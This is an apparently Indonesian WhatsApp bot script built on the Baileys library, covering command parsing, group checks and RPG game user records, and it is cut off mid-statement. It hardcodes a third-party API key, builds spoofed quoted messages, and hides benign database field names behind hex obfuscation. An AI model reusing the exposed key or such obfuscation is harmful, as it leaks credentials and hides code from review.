/**
	@ No Re Upload, recode sendiri base nya klo mau 😏
	@ Sc no enc silahkan cek https://github.com/DikaArdnt/Hisoka-Morou
 
	 「 TqTo 」
	@ My God
	@ My Parents
	@ Fatih A.
	@ Ferdi
	@ DikaArdnt [author]
	@ Mhankbarbar
	@ Nurutomo
	@ Rashid
	@ ZeeoneOfc
	@ Penyedia Module
	@ And All Support
**/


require('./settings')
const { default: makeWASocket, BufferJSON, WAMessageStubType, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia , generateWAMessage, areJidsSameUser, makeInMemoryStore} = require('@adiwajshing/baileys')
const translate = require('@vitalets/google-translate-api')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const cheerio = require('cheerio')
const { fromBuffer } = require('file-type')
const path = require('path')
const os = require('os')
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const google = require('google-it')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const FormData = require("form-data");
const speed = require('performance-now')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon() 
const PhoneNumber = require('awesome-phonenumber')
const moment = require("moment-timezone");
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const hx = require('hxz-api');
const { performance } = require('perf_hooks')
const zee = require('xfarr-api')

const { toAudio, toPTT} = require('./lib/converter')
const { yta, ytv, ytvd, ytvf, servers } = require('./lib/y2mate')
const rpg = require('./lib/games-rpg')
const levelling = require('./lib/levelling')
const { pinterest, wallpaper, wikimedia, hentai, quotesAnime} = require('./lib/scraper')
const {bytesToSize,fileIO,  UploadFileUgu,telesticker, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { UdhAdCoy, ApusAhh } = require('./lib/dbs');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { smsg, getGroupAdmins, formatp, tanggal, tanggal_, tanggal__, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom } = require('./lib/myfunc')
const database = require('./database/database.json')
const stcCmd = JSON.parse(fs.readFileSync('./database/command.json'))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));

pp_bot = fs.readFileSync(thumbnail)
qris = fs.readFileSync(donasi)
moment.tz.setDefault("Asia/Jakarta").locale("id");

// Database Game
const hit_today = []
const kuismath = db.data.game.math = {}
const _family100 = db.data.game.family100 = []
const tebakgambar = db.data.game.tebakgambar = []
const tebakkata = db.data.game.tebakkata = []
const tebakbendera = db.data.game.tebakbendera = []
const siapaaku = db.data.game.siapaaku = []
const tebakkalimat = db.data.game.tebakkalimat = []
const caklontong = db.data.game.caklontong = []
const susunkata = db.data.game.susunkata = []
const tekateki = db.data.game.tekateki = []
const tebakkabupaten = db.data.game.tebakkabupaten = []
const tebakkimia = db.data.game.tebakkimia = []
const tebaklirik = db.data.game.tebaklirik = []
const tebaktebakan = db.data.game.tebaktebakan = []


module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
		var budy = (typeof m.text == 'string' ? m.text : '')
		const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/.test(body)
		const prefix = isCmd ? budy[0] : ''
		const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
        const from = mek.key.remoteJid
		const time = moment(Date.now()).tz(timezone).locale('id').format('HH:mm:ss z')
        const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
        const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
        const salam = moment(Date.now()).tz( timezone).locale('id').format('a')
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
        const isCreator = [alpha.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == alpha.user.id ? true : false
        const text = q = args.join(" ")
        const c = args.join(' ')
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
		const isMedia = /image|video|sticker|audio/.test(mime)
	
        // Group
        const botNumber = alpha.user.id ? alpha.user.id.split(":")[0]+"@s.whatsapp.net" : alpha.user.id
        const groupMetadata = m.isGroup ? await alpha.groupMetadata(m.chat) : ''
        const groupId = m.isGroup ? groupMetadata.id : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
		const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const groupMembers = m.isGroup ? await groupMetadata.participants : ''
        const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		const isNumber = x => typeof x === 'number' && !isNaN(x)
		const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
		const blockList = await alpha.fetchBlocklist()
        if (blockList?.includes(m.sender)) return
		const ini_mark = `0@s.whatsapp.net`
		const timestampi = speed();
		const latensii = speed() - timestampi
		const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: pp_bot, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: pp_bot}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': pp_bot}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': pp_bot}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': pp_bot}}}
		const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: pp_bot}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pp_bot, thumbnail: pp_bot,sendEphemeral: true}}}
		let picaks = [flaming,fluming,flarun,flasmurf]
		let picak = picaks[Math.floor(Math.random() * picaks.length)]
		
		
		const reply = async (teks) => {
			return await alpha.sendFakeLink(m.chat,teks,salam, pushname,ownername, thumbnail, myweb, m)
		}
		const randomArr = (arr = []) => {
            return arr[Math.floor(Math.random() * arr.length)]
        }
        const isEmoji = (emo) => {
            let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
            let regexEmoji = new RegExp(emoji_ranges, 'gi');
            return emo.match(regexEmoji)
        }

		// DATABASE
		var _0xac87=["\x6E\x75\x6D\x62\x65\x72","\x70\x72\x65\x6D\x69\x75\x6D","\x6C\x69\x6D\x69\x74\x61\x77\x61\x6C","\x66\x72\x65\x65","\x73\x65\x6E\x64\x65\x72","\x75\x73\x65\x72\x73","\x64\x61\x74\x61","\x6F\x62\x6A\x65\x63\x74","\x70\x72\x65\x6D\x69\x75\x6D\x54\x69\x6D\x65","\x62\x61\x6E\x6E\x65\x64","\x42\x61\x6E\x6E\x65\x64\x52\x65\x61\x73\x6F\x6E","","\x61\x66\x6B\x54\x69\x6D\x65","\x70\x63","\x61\x66\x6B\x52\x65\x61\x73\x6F\x6E","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x69\x64","\x6C\x69\x6D\x69\x74","\x68\x65\x61\x6C\x74","\x68\x65\x61\x6C\x74\x6D\x6F\x6E\x73\x74\x65\x72","\x74\x69\x74\x6C\x65","\x73\x74\x61\x6D\x69\x6E\x61","\x68\x61\x75\x73","\x6C\x61\x70\x65\x72","\x6C\x65\x76\x65\x6C","\x70\x61\x73\x61\x6E\x67\x61\x6E","\x65\x78\x70","\x6B\x6F\x72\x62\x61\x6E\x6E\x67\x6F\x63\x6F\x6B","\x6F\x6A\x65\x6B\x6B","\x74\x72\x6F\x66\x69","\x72\x74\x72\x6F\x66\x69","\x50\x65\x72\x75\x6E\x67\x67\x75","\x74\x72\x6F\x6F\x70\x63\x61\x6D\x70","\x63\x6F\x69\x6E","\x61\x74\x6D","\x74\x70\x72\x65\x6D","\x74\x69\x67\x61\x6D\x65","\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x6D\x6F\x6E\x65\x79","\x62\x61\x6E\x6B","\x72\x75\x6D\x61\x68\x73\x61\x6B\x69\x74","\x66\x6F\x72\x74\x72\x65\x73\x73","\x73\x68\x69\x65\x6C\x64","\x70\x65\x72\x74\x61\x6E\x69\x61\x6E","\x70\x65\x72\x74\x61\x6D\x62\x61\x6E\x67\x61\x6E","\x62\x6F\x74\x6F\x6C","\x6B\x61\x72\x64\x75\x73","\x6B\x61\x6C\x65\x6E\x67","\x61\x71\x75\x61","\x64\x69\x61\x6D\x6F\x6E\x64","\x69\x72\x6F\x6E","\x65\x6D\x61\x73","\x61\x72\x6C\x6F\x6B","\x63\x6F\x6D\x6D\x6F\x6E","\x62\x6F\x78\x73","\x63\x75\x70\x6F\x6E","\x61\x73","\x75\x6E\x63\x6F\x6D\x6D\x6F\x6E","\x6D\x79\x74\x68\x69\x63","\x6C\x65\x67\x65\x6E\x64\x61\x72\x79","\x67\x6C\x6F\x72\x79","\x65\x6E\x63\x68\x61\x6E\x74","\x70\x65\x74","\x70\x73\x65\x70\x69\x63\x6B","\x70\x73\x65\x6E\x6A\x61\x74\x61","\x70\x6F\x74\x69\x6F\x6E","\x73\x61\x6D\x70\x61\x68","\x61\x72\x6D\x6F\x72","\x70\x61\x6E\x63\x69\x6E\x67","\x61\x70\x65\x6C","\x61\x79\x61\x6D\x62","\x61\x79\x61\x6D\x67","\x73\x61\x70\x69\x72","\x73\x73\x61\x70\x69","\x65\x73\x74\x65\x68","\x6C\x65\x6C\x65\x67","\x6C\x65\x6C\x65\x62","\x73\x77\x6F\x72\x64","\x73\x77\x6F\x72\x64\x64\x75\x72\x61\x62\x69\x6C\x69\x74\x79","\x70\x69\x63\x6B\x61\x78\x65","\x70\x69\x63\x6B\x61\x78\x65\x64\x75\x72\x61\x62\x69\x6C\x69\x74\x79","\x66\x69\x73\x68\x69\x6E\x67\x72\x6F\x64","\x66\x69\x73\x68\x69\x6E\x67\x72\x6F\x64\x64\x75\x72\x61\x62\x69\x6C\x69\x74\x79","\x75\x6D\x70\x61\x6E","\x6B\x75\x63\x69\x6E\x67","\x6B\x75\x63\x69\x6E\x67\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x6B\x75\x64\x61","\x6B\x75\x64\x61\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x72\x75\x62\x61\x68","\x72\x75\x62\x61\x68\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x61\x6E\x6A\x69\x6E\x67","\x61\x6E\x6A\x69\x6E\x67\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x73\x65\x72\x69\x67\x61\x6C\x61\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x6E\x61\x67\x61\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x70\x68\x6F\x6E\x69\x78\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x67\x72\x69\x66\x66\x69\x6E\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x63\x65\x6E\x74\x61\x75\x72\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x6D\x61\x6B\x61\x6E\x61\x6E\x70\x65\x74","\x6D\x61\x6B\x61\x6E\x61\x6E\x6E\x61\x67\x61","\x6D\x61\x6B\x61\x6E\x61\x6E\x70\x68\x6F\x6E\x69\x78","\x6D\x61\x6B\x61\x6E\x61\x6E\x67\x72\x69\x66\x66\x69\x6E","\x6D\x61\x6B\x61\x6E\x61\x6E\x73\x65\x72\x69\x67\x61\x6C\x61","\x6D\x61\x6B\x61\x6E\x61\x6E\x63\x65\x6E\x74\x61\x75\x72","\x77\x61\x72\x6E","\x68\x65\x61\x6C\x74\x68\x6D\x6F\x6E\x73\x74\x65\x72","\x61\x6E\x61\x6B\x6B\x75\x63\x69\x6E\x67","\x61\x6E\x61\x6B\x6B\x75\x64\x61","\x61\x6E\x61\x6B\x72\x75\x62\x61\x68","\x61\x6E\x61\x6B\x61\x6E\x6A\x69\x6E\x67","\x73\x65\x72\x69\x67\x61\x6C\x61","\x61\x6E\x61\x6B\x73\x65\x72\x69\x67\x61\x6C\x61","\x6E\x61\x67\x61","\x61\x6E\x61\x6B\x6E\x61\x67\x61","\x70\x68\x6F\x6E\x69\x78","\x61\x6E\x61\x6B\x70\x68\x6F\x6E\x69\x78","\x67\x72\x69\x66\x66\x69\x6E","\x61\x6E\x61\x6B\x67\x72\x69\x66\x66\x69\x6E","\x6B\x79\x75\x62\x69","\x61\x6E\x61\x6B\x6B\x79\x75\x62\x69","\x63\x65\x6E\x74\x61\x75\x72","\x61\x6E\x61\x6B\x63\x65\x6E\x74\x61\x75\x72","\x61\x6E\x74\x69\x73\x70\x61\x6D","\x61\x6E\x74\x69\x73\x70\x61\x6D\x6C\x61\x73\x74\x63\x6C\x61\x69\x6D","\x6B\x61\x79\x75","\x6B\x69\x6E\x67\x64\x6F\x6D","\x62\x61\x74\x75","\x72\x61\x6D\x75\x61\x6E","\x73\x74\x72\x69\x6E\x67","\x70\x61\x75\x73","\x6B\x65\x70\x69\x74\x69\x6E\x67","\x67\x75\x72\x69\x74\x61","\x63\x75\x6D\x69","\x62\x75\x6E\x74\x61\x6C","\x64\x6F\x72\x79","\x6C\x75\x6D\x62\x61","\x6C\x6F\x62\x73\x74\x65\x72","\x68\x69\x75","\x75\x64\x61\x6E\x67","\x69\x6B\x61\x6E","\x6E\x69\x6C\x61","\x62\x61\x77\x61\x6C","\x6C\x65\x6C\x65","\x6F\x72\x63\x61","\x62\x61\x6E\x74\x65\x6E\x67","\x68\x61\x72\x69\x6D\x61\x75","\x67\x61\x6A\x61\x68","\x6B\x61\x6D\x62\x69\x6E\x67","\x70\x61\x6E\x64\x61","\x62\x75\x61\x79\x61","\x6B\x65\x72\x62\x61\x75","\x73\x61\x70\x69","\x6D\x6F\x6E\x79\x65\x74","\x62\x61\x62\x69\x68\x75\x74\x61\x6E","\x62\x61\x62\x69","\x61\x79\x61\x6D","\x6C\x61\x73\x74\x61\x64\x76\x65\x6E\x74\x75\x72\x65","\x6C\x61\x73\x74\x6F\x70\x65\x6E","\x6C\x61\x73\x74\x6B\x69\x6C\x6C","\x6C\x61\x73\x74\x62\x61\x6E\x6E\x65\x64","\x6C\x61\x73\x74\x6E\x67\x75\x6C\x69","\x6C\x61\x73\x74\x66\x69\x73\x68\x69\x6E\x67","\x6C\x61\x73\x74\x64\x75\x6E\x67\x65\x6F\x6E","\x6C\x61\x73\x74\x77\x61\x72","\x6C\x61\x73\x74\x73\x64\x61","\x6C\x61\x73\x74\x62\x65\x72\x62\x72\x75","\x6C\x61\x73\x74\x64\x75\x65\x6C","\x6C\x61\x73\x74\x6A\x62","\x6C\x61\x73\x74\x53\x65\x74\x53\x74\x61\x74\x75\x73","\x6C\x61\x73\x74\x6D\x69\x6E\x69\x6E\x67","\x6C\x61\x73\x74\x68\x75\x6E\x74","\x6C\x61\x73\x74\x6E\x67\x6F\x63\x6F\x6B","\x6C\x61\x73\x74\x67\x69\x66\x74","\x6C\x61\x73\x74\x72\x6F\x62","\x6C\x61\x73\x74\x6E\x67\x6F\x6A\x65\x6B","\x6C\x61\x73\x74\x67\x72\x61\x62","\x6C\x61\x73\x74\x62\x65\x72\x6B\x65\x62\x6F\x6E","\x6C\x61\x73\x74\x63\x6F\x64\x65\x72\x65\x67","\x6C\x61\x73\x74\x64\x61\x67\x61\x6E\x67","\x6C\x61\x73\x74\x68\x6F\x75\x72\x6C\x79","\x6C\x61\x73\x74\x77\x65\x65\x6B\x6C\x79","\x6C\x61\x73\x74\x6D\x6F\x6E\x74\x68\x6C\x79","\x6C\x61\x73\x74\x49\x73\x74\x69\x67\x66\x61\x72","\x6C\x61\x73\x74\x74\x75\x72\x75","\x6C\x61\x73\x74\x73\x65\x65\x6E","\x6C\x61\x73\x74\x62\x61\x6E\x73\x6F\x73","\x6C\x61\x73\x74\x72\x61\x6D\x70\x6F\x6B","\x72\x65\x67\x69\x73\x74\x65\x72\x65\x64","\x6E\x61\x6D\x65","\x67\x65\x6E\x64\x65\x72","\x68\x6F\x62\x69","\x73\x65\x72\x69\x61\x6C\x4E\x75\x6D\x62\x65\x72","\x61\x6E\x67\x67\x75\x72","\x6A\x65\x72\x75\x6B","\x73\x65\x6D\x61\x6E\x67\x6B\x61","\x6D\x61\x6E\x67\x67\x61","\x73\x74\x72\x6F\x62\x65\x72\x69","\x70\x69\x73\x61\x6E\x67","\x6D\x61\x6B\x61\x6E\x61\x6E","\x62\x69\x62\x69\x74\x61\x6E\x67\x67\x75\x72","\x62\x69\x62\x69\x74\x70\x69\x73\x61\x6E\x67","\x62\x69\x62\x69\x74\x61\x70\x65\x6C","\x62\x69\x62\x69\x74\x6D\x61\x6E\x67\x67\x61","\x62\x69\x62\x69\x74\x6A\x65\x72\x75\x6B","\x67\x61\x72\x64\x65\x6E\x62\x6F\x78\x73","\x61\x67\x65","\x70\x72\x65\x6D\x69\x75\x6D\x44\x61\x74\x65","\x72\x65\x67\x54\x69\x6D\x65","\x6A\x6F\x62","\x50\x65\x6E\x67\x61\x6E\x67\x67\x75\x72\x61\x6E","\x6C\x62\x61\x72\x73","\x5B\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\x5D","\x72\x6F\x6C\x65","\x4E\x65\x77\x62\x69\x65\x20\u32E1","\x61\x75\x74\x6F\x6C\x65\x76\x65\x6C\x75\x70","\x70\x65\x72\x75\x6E\x67\x67\x75","\x63\x68\x61\x74","\x63\x68\x61\x74\x73","\x2D","\x67\x6F\x6F\x64\x62\x79\x65","\x77\x65\x6C\x63\x6F\x6D\x65","\x70\x72\x6F\x6D\x6F\x74\x65","\x64\x65\x6D\x6F\x74\x65","\x6D\x75\x74\x65","\x63\x61\x70\x74\x69\x6F\x6E\x50\x61\x79","\x6E\x73\x66\x77","\x73\x65\x77\x61","\x61\x6E\x74\x69\x6C\x69\x6E\x6B","\x61\x6E\x74\x69\x6F\x6E\x63\x65","\x73\x65\x74\x57\x65\x6C\x63\x6F\x6D\x65","\x73\x65\x74\x4C\x65\x61\x76\x65","\x73\x65\x74\x50\x72\x6F\x6D\x6F\x74\x65","\x73\x65\x74\x44\x65\x6D\x6F\x74\x65","\x73\x65\x74\x50\x72\x6F\x73\x65\x73","\x73\x65\x74\x44\x6F\x6E\x65","\x70\x61\x79\x67\x63","\x65\x78\x70\x69\x72\x65\x64","\x73\x65\x74\x74\x69\x6E\x67\x73","\x61\x75\x74\x6F\x72\x65\x61\x64","\x61\x75\x74\x6F\x62\x69\x6F","\x61\x76\x61\x69\x6C\x61\x62\x6C\x65","\x75\x73\x65\x72\x52\x65\x67\x69\x73\x74\x65\x72","\x63\x6F\x6D\x70\x6F\x73\x69\x6E\x67","\x72\x65\x63\x6F\x72\x64\x69\x6E\x67","\x61\x75\x74\x6F\x62\x6C\x6F\x6B","\x61\x75\x74\x6F\x72\x65\x73\x70\x6F\x6E\x64","\x6C\x6F\x67"];try{let isNumber=(_0x678dx2)=>{return  typeof _0x678dx2=== _0xac87[0]&&  !isNaN(_0x678dx2)};let limitUser=isPremium?global[_0xac87[2]][_0xac87[1]]:global[_0xac87[2]][_0xac87[3]];let user=db[_0xac87[6]][_0xac87[5]][m[_0xac87[4]]];if( typeof user!== _0xac87[7]){db[_0xac87[6]][_0xac87[5]][m[_0xac87[4]]]= {}};if(user){if(!(_0xac87[1] in  user)){user[_0xac87[1]]= false};if(!isNumber(user[_0xac87[8]])){user[_0xac87[8]]= 0};if(!(_0xac87[9] in  user)){user[_0xac87[9]]= false};if(!_0xac87[10] in  user){user[_0xac87[10]]= _0xac87[11]};if(!isNumber(user[_0xac87[12]])){user[_0xac87[12]]=  -1};if(!isNumber(user[_0xac87[13]])){user[_0xac87[13]]= 0};if(!(_0xac87[14] in  user)){user[_0xac87[14]]= _0xac87[11]};if(!(_0xac87[15] in  user)){user[_0xac87[15]]= _0xac87[16]};if(!isNumber(user[_0xac87[17]])){user[_0xac87[17]]= user[_0xac87[1]]?limitawal[_0xac87[1]]:limitawal[_0xac87[3]]};if(!isNumber(user[_0xac87[18]])){user[_0xac87[18]]= 100};if(!isNumber(user[_0xac87[19]])){user[_0xac87[19]]= 0};if(!isNumber(user[_0xac87[20]])){user[_0xac87[20]]= 0};if(!isNumber(user[_0xac87[21]])){user[_0xac87[21]]= 100};if(!isNumber(user[_0xac87[22]])){user[_0xac87[22]]= 100};if(!isNumber(user[_0xac87[23]])){user[_0xac87[23]]= 100};if(!isNumber(user[_0xac87[24]])){user[_0xac87[24]]= 0};if(!(_0xac87[25] in  user)){user[_0xac87[25]]= _0xac87[11]};if(!isNumber(user[_0xac87[26]])){user[_0xac87[26]]= 0};if(!isNumber(user[_0xac87[27]])){user[_0xac87[27]]= 0};if(!isNumber(user[_0xac87[28]])){user[_0xac87[28]]= 0};if(!isNumber(user[_0xac87[29]])){user[_0xac87[29]]= 0};if(!user[_0xac87[30]]){user[_0xac87[30]]= _0xac87[31]};if(!isNumber(user[_0xac87[32]])){user[_0xac87[32]]= 0};if(!isNumber(user[_0xac87[33]])){user[_0xac87[33]]= 0};if(!isNumber(user[_0xac87[34]])){user[_0xac87[34]]= 0};if(!isNumber(user[_0xac87[35]])){user[_0xac87[35]]= 0};if(!isNumber(user[_0xac87[36]])){user[_0xac87[36]]= 50};if(!isNumber(user[_0xac87[37]])){user[_0xac87[37]]= 0};if(!isNumber(user[_0xac87[38]])){user[_0xac87[38]]= 1000};if(!isNumber(user[_0xac87[39]])){user[_0xac87[39]]= 1000};if(!isNumber(user[_0xac87[40]])){user[_0xac87[40]]= 0};if(!isNumber(user[_0xac87[41]])){user[_0xac87[41]]= 0};if(!isNumber(user[_0xac87[42]])){user[_0xac87[42]]= false};if(!isNumber(user[_0xac87[43]])){user[_0xac87[43]]= 0};if(!isNumber(user[_0xac87[44]])){user[_0xac87[44]]= 0};if(!isNumber(user[_0xac87[45]])){user[_0xac87[45]]= 0};if(!isNumber(user[_0xac87[46]])){user[_0xac87[46]]= 0};if(!isNumber(user[_0xac87[47]])){user[_0xac87[47]]= 0};if(!isNumber(user[_0xac87[48]])){user[_0xac87[48]]= 0};if(!isNumber(user[_0xac87[49]])){user[_0xac87[49]]= 0};if(!isNumber(user[_0xac87[50]])){user[_0xac87[50]]= 0};if(!isNumber(user[_0xac87[51]])){user[_0xac87[51]]= 0};if(!isNumber(user[_0xac87[52]])){user[_0xac87[52]]= 0};if(!isNumber(user[_0xac87[53]])){user[_0xac87[53]]= 0};if(!isNumber(user[_0xac87[54]])){user[_0xac87[54]]= 0};if(!isNumber(user[_0xac87[55]])){user[_0xac87[55]]= 0};if(!isNumber(user[_0xac87[56]])){user[_0xac87[56]]= 0};if(!isNumber(user[_0xac87[57]])){user[_0xac87[57]]= 0};if(!isNumber(user[_0xac87[58]])){user[_0xac87[58]]= 0};if(!isNumber(user[_0xac87[59]])){user[_0xac87[59]]= 0};if(!isNumber(user[_0xac87[60]])){user[_0xac87[60]]= 0};if(!isNumber(user[_0xac87[61]])){user[_0xac87[61]]= 0};if(!isNumber(user[_0xac87[62]])){user[_0xac87[62]]= 0};if(!isNumber(user[_0xac87[63]])){user[_0xac87[63]]= 0};if(!isNumber(user[_0xac87[64]])){user[_0xac87[64]]= 0};if(!isNumber(user[_0xac87[65]])){user[_0xac87[65]]= 0};if(!isNumber(user[_0xac87[66]])){user[_0xac87[66]]= 0};if(!isNumber(user[_0xac87[67]])){user[_0xac87[67]]= 0};if(!isNumber(user[_0xac87[68]])){user[_0xac87[68]]= 0};if(!isNumber(user[_0xac87[69]])){user[_0xac87[69]]= 0};if(!isNumber(user[_0xac87[70]])){user[_0xac87[70]]= 0};if(!isNumber(user[_0xac87[71]])){user[_0xac87[71]]= 0};if(!isNumber(user[_0xac87[72]])){user[_0xac87[72]]= 0};if(!isNumber(user[_0xac87[73]])){user[_0xac87[73]]= 0};if(!isNumber(user[_0xac87[74]])){user[_0xac87[74]]= 0};if(!isNumber(user[_0xac87[75]])){user[_0xac87[75]]= 0};if(!isNumber(user[_0xac87[76]])){user[_0xac87[76]]= 0};if(!isNumber(user[_0xac87[77]])){user[_0xac87[77]]= 0};if(!isNumber(user[_0xac87[78]])){user[_0xac87[78]]= 0};if(!isNumber(user[_0xac87[79]])){user[_0xac87[79]]= 0};if(!isNumber(user[_0xac87[80]])){user[_0xac87[80]]= 0};if(!isNumber(user[_0xac87[81]])){user[_0xac87[81]]= 0};if(!isNumber(user[_0xac87[82]])){user[_0xac87[82]]= 0};if(!isNumber(user[_0xac87[83]])){user[_0xac87[83]]= 0};if(!isNumber(user[_0xac87[84]])){user[_0xac87[84]]= 0};if(!isNumber(user[_0xac87[85]])){user[_0xac87[85]]= 0};if(!isNumber(user[_0xac87[86]])){user[_0xac87[86]]= 0};if(!isNumber(user[_0xac87[87]])){user[_0xac87[87]]= 0};if(!isNumber(user[_0xac87[88]])){user[_0xac87[88]]= 0};if(!isNumber(user[_0xac87[89]])){user[_0xac87[89]]= 0};if(!isNumber(user[_0xac87[90]])){user[_0xac87[90]]= 0};if(!isNumber(user[_0xac87[91]])){user[_0xac87[91]]= 0};if(!isNumber(user[_0xac87[92]])){user[_0xac87[92]]= 0};if(!isNumber(user[_0xac87[93]])){user[_0xac87[93]]= 0};if(!isNumber(user[_0xac87[94]])){user[_0xac87[94]]= 0};if(!isNumber(user[_0xac87[95]])){user[_0xac87[95]]= 0};if(!isNumber(user[_0xac87[96]])){user[_0xac87[96]]= 0};if(!isNumber(user[_0xac87[97]])){user[_0xac87[97]]};if(!isNumber(user[_0xac87[98]])){user[_0xac87[98]]= 0};if(!isNumber(user[_0xac87[99]])){user[_0xac87[99]]= 0};if(!isNumber(user[_0xac87[100]])){user[_0xac87[100]]= 0};if(!isNumber(user[_0xac87[101]])){user[_0xac87[101]]= 0};if(!isNumber(user[_0xac87[102]])){user[_0xac87[102]]= 